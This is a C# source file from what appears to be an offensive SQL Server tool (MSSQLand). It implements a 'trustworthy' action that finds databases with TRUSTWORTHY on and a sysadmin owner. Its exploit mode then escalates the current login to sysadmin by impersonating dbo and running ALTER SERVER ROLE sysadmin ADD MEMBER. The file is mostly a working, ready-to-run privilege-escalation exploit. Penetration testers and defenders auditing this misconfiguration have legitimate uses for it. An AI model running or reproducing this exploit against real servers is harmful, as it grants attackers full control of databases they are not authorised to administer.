using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;
using System;
using System.Data;

namespace MSSQLand.Actions.Database
{
    /// <summary>
    /// Checks for privilege escalation vulnerabilities via the TRUSTWORTHY database setting.
    /// 
    /// This action identifies databases that are vulnerable to privilege escalation attacks
    /// where a low-privileged user (e.g., db_owner) can escalate to sysadmin by exploiting:
    /// 
    /// 1. Database owner with sysadmin privileges (often 'sa')
    /// 2. TRUSTWORTHY database property set to ON
    /// 3. User membership in db_owner role (can impersonate dbo)
    /// 
    /// Usage:
    /// - No arguments: Check all databases for privilege escalation vulnerabilities
    /// - trustworthy [database]: Check specific database
    /// - trustworthy -d [database] -e: Exploit and escalate current user to sysadmin
    /// </summary>
    internal class Trustworthy : BaseAction
    {
        [ArgumentMetadata(Position = 0, ShortName = "d", LongName = "database", Description = "Specific database to check (optional - checks all if omitted)")]
        private string? _database = null;

        [ArgumentMetadata(ShortName = "e", LongName = "exploit", Description = "Exploit vulnerability and escalate current user to sysadmin")]
        private bool _exploitMode = false;

        public override void ValidateArguments(string[] args)
        {
            var (namedArgs, positionalArgs) = ParseActionArguments(args);

            // Get database from positional or named arguments
            _database = GetPositionalArgument(positionalArgs, 0, null);
            if (string.IsNullOrEmpty(_database))
            {
                _database = GetNamedArgument(namedArgs, "database", GetNamedArgument(namedArgs, "d", null));
            }

            // Check for exploit flag
            if (namedArgs.ContainsKey("exploit") || namedArgs.ContainsKey("e"))
            {
                _exploitMode = true;
            }

            // Exploit mode requires a database
            if (_exploitMode && string.IsNullOrEmpty(_database))
            {
                throw new ArgumentException("Exploit mode requires a database name. Usage: trustworthy -d <database> -e");
            }
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            // If exploit mode, perform actual privilege escalation
            if (_exploitMode)
            {
                return ExploitPrivilegeEscalation(databaseContext, _database);
            }

            // Otherwise, scan for vulnerable databases
            return ScanVulnerableDatabases(databaseContext, _database);
        }

        /// <summary>
        /// Scans databases for TRUSTWORTHY privilege escalation vulnerabilities.
        /// </summary>
        private DataTable ScanVulnerableDatabases(DatabaseContext databaseContext, string? specificDatabase)
        {
            if (string.IsNullOrEmpty(specificDatabase))
            {
                Logger.TaskNested("Scanning all databases for TRUSTWORTHY privilege escalation vulnerabilities");
            }
            else
            {
                Logger.TaskNested($"Checking database '{specificDatabase}' for TRUSTWORTHY vulnerabilities");
            }

            string databaseFilter = string.IsNullOrEmpty(specificDatabase) 
                ? "" 
                : $"AND d.name = '{specificDatabase.Replace("'", "''")}'";

            // Query to find vulnerable databases
            string query = $@"
DECLARE @Results TABLE (
    [Database] NVARCHAR(128),
    [DatabaseID] INT,
    [Owner] NVARCHAR(128),
    [Trustworthy] BIT,
    [OwnerIsSysadmin] VARCHAR(3),
    [Created] DATETIME,
    [State] NVARCHAR(60),
    [CurrentUserIsDbOwner] VARCHAR(3)
);

DECLARE @dbname NVARCHAR(128);
DECLARE @sql NVARCHAR(MAX);
DECLARE @owner NVARCHAR(128);
DECLARE @trustworthy BIT;
DECLARE @ownerIsSysadmin VARCHAR(3);
DECLARE @created DATETIME;
DECLARE @state NVARCHAR(60);
DECLARE @dbid INT;
DECLARE @isDbOwner VARCHAR(3);

DECLARE db_cursor CURSOR FOR
SELECT 
    name,
    database_id,
    SUSER_SNAME(owner_sid) AS [Owner],
    is_trustworthy_on,
    CASE 
        WHEN IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(owner_sid)) = 1 THEN 'YES'
        ELSE 'NO'
    END AS [OwnerIsSysadmin],
    create_date,
    state_desc
FROM sys.databases
{databaseFilter}

OPEN db_cursor;
FETCH NEXT FROM db_cursor INTO @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin, @created, @state;

WHILE @@FETCH_STATUS = 0
BEGIN
    SET @isDbOwner = 'NO';
    
    -- Check if current user has access and is db_owner in this database (only for ONLINE databases)
    IF HAS_DBACCESS(@dbname) = 1 AND @state = 'ONLINE'
    BEGIN
        BEGIN TRY
            SET @sql = N'USE [' + REPLACE(@dbname, ']', ']]') + N']; 
                         SELECT @result = CASE WHEN IS_MEMBER(''db_owner'') = 1 THEN ''YES'' ELSE ''NO'' END;';
            EXEC sp_executesql @sql, N'@result VARCHAR(3) OUTPUT', @result = @isDbOwner OUTPUT;
        END TRY
        BEGIN CATCH
            SET @isDbOwner = 'NO';
        END CATCH
    END
    
    INSERT INTO @Results VALUES (
        @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin, 
        @created, @state, @isDbOwner
    );
    
    FETCH NEXT FROM db_cursor INTO @dbname, @dbid, @owner, @trustworthy, @ownerIsSysadmin, @created, @state;
END;

CLOSE db_cursor;
DEALLOCATE db_cursor;

SELECT * FROM @Results
ORDER BY 
    CASE 
        WHEN Trustworthy = 1 AND OwnerIsSysadmin = 'YES' THEN 1
        WHEN Trustworthy = 1 THEN 2
        ELSE 3
    END,
    [Database];";

            try
            {
                DataTable results = databaseContext.QueryService.ExecuteTable(query);

                if (results.Rows.Count == 0)
                {
                    Logger.Warning("No user databases found or no access to check TRUSTWORTHY settings.");
                    return results;
                }

                // Count vulnerabilities
                int vulnerable = 0;
                int exploitable = 0;

                foreach (DataRow row in results.Rows)
                {
                    bool trustworthy = Convert.ToBoolean(row["Trustworthy"]);
                    string ownerIsSysadmin = row["OwnerIsSysadmin"].ToString();
                    string currentUserIsDbOwner = row["CurrentUserIsDbOwner"]?.ToString() ?? "NO";

                    if (trustworthy && ownerIsSysadmin == "YES")
                    {
                        vulnerable++;
                        if (currentUserIsDbOwner == "YES")
                        {
                            exploitable++;
                        }
                    }
                }

                Console.WriteLine(OutputFormatter.ConvertDataTable(results));

                // Display summary
                if (vulnerable > 0)
                {
                    Logger.Success($"Found {vulnerable} vulnerable database(s) with TRUSTWORTHY=ON and sysadmin owner");
                    
                    if (exploitable > 0)
                    {
                        Logger.SuccessNested("Use -e flag to exploit.");
                    }
                }
                else
                {
                    Logger.Error("No TRUSTWORTHY vulnerabilities detected in accessible databases.");
                }

                return results;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error scanning databases: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Exploits TRUSTWORTHY vulnerability to escalate current user to sysadmin.
        /// </summary>
        private object? ExploitPrivilegeEscalation(DatabaseContext databaseContext, string database)
        {
            Logger.TaskNested($"Exploiting TRUSTWORTHY vulnerability on database '{database}'");
            Logger.TaskNested("This will escalate your current user to sysadmin");
            
            try
            {
                if (databaseContext.UserService.IsAdmin())
                {
                    Logger.Success("Already sysadmin. No escalation needed.");
                    return true;
                }

                // Get current login
                string currentLoginQuery = "SELECT SUSER_NAME() AS [CurrentLogin];";
                DataTable loginInfo = databaseContext.QueryService.ExecuteTable(currentLoginQuery);
                string currentLogin = loginInfo.Rows[0]["CurrentLogin"].ToString();

                string dbPropsQuery = $@"
SELECT 
    d.name AS [Database],
    SUSER_SNAME(d.owner_sid) AS [Owner],
    d.is_trustworthy_on AS [Trustworthy],
    IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) AS [OwnerIsSysadmin]
FROM sys.databases d
WHERE d.name = '{database.Replace("'", "''")}';";

                DataTable dbProps = databaseContext.QueryService.ExecuteTable(dbPropsQuery);
                
                if (dbProps.Rows.Count == 0)
                {
                    Logger.Error($"Database '{database}' not found or no access.");
                    return false;
                }

                string owner = dbProps.Rows[0]["Owner"].ToString();
                bool trustworthy = Convert.ToBoolean(dbProps.Rows[0]["Trustworthy"]);
                bool ownerIsSysadmin = Convert.ToInt32(dbProps.Rows[0]["OwnerIsSysadmin"]) == 1;

                // Verify db_owner membership
                string membershipQuery = $"USE [{database}]; SELECT IS_MEMBER('db_owner') AS [IsDbOwner];";
                DataTable membership = databaseContext.QueryService.ExecuteTable(membershipQuery);
                bool isDbOwner = Convert.ToInt32(membership.Rows[0]["IsDbOwner"]) == 1;

                // Check if vulnerable
                if (!trustworthy || !ownerIsSysadmin || !isDbOwner)
                {
                    Logger.Error("Database is NOT vulnerable to TRUSTWORTHY escalation!");
                    
                    if (!trustworthy)
                        Logger.Error("TRUSTWORTHY is OFF");
                    if (!ownerIsSysadmin)
                        Logger.Error($"Database owner '{owner}' is not sysadmin");
                    if (!isDbOwner)
                        Logger.Error("Current user is not db_owner");
                    
                    return false;
                }

                Logger.TaskNested($"Escalating user '{currentLogin}' to sysadmin");
                
                string exploitQuery = $@"
USE [{database}];
EXECUTE AS USER = 'dbo';
ALTER SERVER ROLE sysadmin ADD MEMBER [{currentLogin}];
SELECT 
    '{currentLogin}' AS [Login],
    IS_SRVROLEMEMBER('sysadmin', '{currentLogin}') AS [IsSysadmin];
REVERT;";

                try
                {
                    DataTable result = databaseContext.QueryService.ExecuteTable(exploitQuery);
                    
                    if (result.Rows.Count > 0)
                    {
                        bool escalated = Convert.ToInt32(result.Rows[0]["IsSysadmin"]) == 1;
                        
                        if (escalated)
                        {
                            Logger.Success($"User '{currentLogin}' is now SYSADMIN!");
                            Logger.SuccessNested($"ALTER SERVER ROLE sysadmin DROP MEMBER [{currentLogin}];");
                            return true;
                        }

                        Logger.Error("Escalation failed. User not added to sysadmin role.");
                        return false;
                    }

                    Logger.Error("Escalation failed. No result returned.");
                    return false;
                }
                catch (Exception ex)
                {
                    Logger.Error($"Exploitation failed: {ex.Message}");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Error during exploitation: {ex.Message}");
                return false;
            }
        }
    }
}
